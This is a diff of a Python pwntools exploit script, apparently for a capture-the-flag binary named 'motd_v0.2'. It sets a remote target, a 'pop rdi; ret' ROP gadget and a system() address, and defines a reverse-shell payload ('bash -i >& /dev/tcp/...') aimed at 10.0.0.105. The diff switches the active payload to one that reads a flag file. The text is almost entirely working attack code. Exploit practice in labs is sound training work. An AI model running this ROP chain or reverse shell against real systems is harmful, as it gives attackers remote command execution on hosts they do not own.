@@ -50,7 +50,7 @@ Explanation:
 """
 
 REMOTE = ('127.0.0.1', 3002)
-REMOTE = None
+# REMOTE = None
 
 TARGET = '../bin/motd_v0.2' # Binary path (local)
 LHOST  = "10.0.0.105"       # Reverse shell host
@@ -60,7 +60,7 @@ DEBUG  = False               # Follow along in GDB
 PIVOT  = 0x4017b3 # ROPGadget.py --binary motd_v0.2 | grep 'pop rdi' # pop rdi; ret
 SYSTEM = 0x401652 # main jumps to system for us => Doesn't matter if libc is ASLR.
 PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1\x00".format(LHOST, LPORT)
-# PAYLOAD = "cat ~/flag.txt; exit\x00"
+PAYLOAD = "cat ~/flag.txt; exit\x00"
 
 if not DEBUG:
     p = process(TARGET) if REMOTE is None else remote(*REMOTE)
